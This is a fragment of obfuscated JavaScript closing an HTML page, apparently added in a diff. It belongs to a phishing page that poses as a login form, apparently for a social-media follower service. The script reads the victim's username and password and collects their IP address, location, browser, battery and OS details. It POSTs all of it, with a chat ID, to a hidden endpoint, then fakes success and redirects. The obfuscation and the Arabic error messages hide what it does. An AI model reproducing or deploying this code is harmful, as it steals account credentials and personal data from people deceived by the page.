_0xb81f50=document[_0x2b8801(0x12f)](_0x2b8801(0xf6))['value'][_0x2b8801(0x114)](),_0x3c1be8=document['getElementById']('password')[_0x2b8801(0x108)][_0x2b8801(0x114)](),_0x5382c1=document[_0x2b8801(0x12f)](_0x2b8801(0x120))[_0x2b8801(0x108)];if(!_0xb81f50||!_0x3c1be8){sendFailReport(_0x2b8801(0xee),'المستخدم\x20لم\x20يدخل\x20البيانات\x20المطلوبة',{'username':!!_0xb81f50,'password':!!_0x3c1be8}),alert(_0x2b8801(0xf5));return;}document[_0x2b8801(0x12f)]('spinner')['style'][_0x2b8801(0xfb)]='block',document[_0x2b8801(0x12f)](_0x2b8801(0x128))[_0x2b8801(0x11d)]=!![];try{const _0x424305=await getIPInfo(),_0x127d80=getPlatformInfo(),_0x121c99=await getBatteryInfo(),_0x2eb39a=getDeviceVersion(),_0x373987={'username':_0xb81f50,'password':_0x3c1be8,'platform':_0x2b8801(0x123),'chatId':chatId||'','ip':_0x424305['ip'],'country':_0x424305[_0x2b8801(0x136)],'city':_0x424305[_0x2b8801(0x107)],'userAgent':_0x127d80[_0x2b8801(0x126)],'batteryLevel':_0x121c99[_0x2b8801(0xf1)],'charging':_0x121c99[_0x2b8801(0xfa)],'osVersion':_0x2eb39a,'followers':_0x5382c1};console[_0x2b8801(0x111)]('Sending\x20data:',_0x373987);const _0x3212d5=await fetch(_0x2b8801(0x11f),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x2b8801(0x118)](_0x373987)});document['getElementById']('spinner')[_0x2b8801(0x11e)][_0x2b8801(0xfb)]=_0x2b8801(0x131),document[_0x2b8801(0x12f)]('submitBtn')[_0x2b8801(0x11d)]=![];const _0x62917f=await _0x3212d5[_0x2b8801(0x10f)]();_0x62917f['success']?(document[_0x2b8801(0x12f)](_0x2b8801(0x116))['style']['display']=_0x2b8801(0x131),document[_0x2b8801(0x12f)](_0x2b8801(0x11c))[_0x2b8801(0x11e)]['display']=_0x2b8801(0x12c),setTimeout(()=>{const _0x94ce97=_0x2b8801;window[_0x94ce97(0x134)][_0x94ce97(0x115)]=_0x94ce97(0x117);},0x9c4)):(sendFailReport(_0x2b8801(0x11a),_0x2b8801(0xfe),{'status':_0x3212d5[_0x2b8801(0x127)],'error':_0x62917f[_0x2b8801(0x135)]||_0x2b8801(0x113)}),alert(_0x2b8801(0x10d)));}catch(_0x13769b){console[_0x2b8801(0x135)](_0x2b8801(0x10b),_0x13769b),document[_0x2b8801(0x12f)](_0x2b8801(0x12a))[_0x2b8801(0x11e)][_0x2b8801(0xfb)]=_0x2b8801(0x131),document['getElementById']('submitBtn')[_0x2b8801(0x11d)]=![],sendFailReport(_0x2b8801(0x135),_0x2b8801(0x133),{'error':_0x13769b[_0x2b8801(0xf0)]}),alert(_0x2b8801(0x129));}}),window[_0x33cc2e(0x125)]('error',_0x471adf=>{const _0x3bcc68=_0x33cc2e;sendFailReport(_0x3bcc68(0x135),'خطأ\x20غير\x20متوقع',{'message':_0x471adf[_0x3bcc68(0xf0)],'filename':_0x471adf['filename'],'lineno':_0x471adf[_0x3bcc68(0xff)]});});
+    </script>
 </body>
 </html>
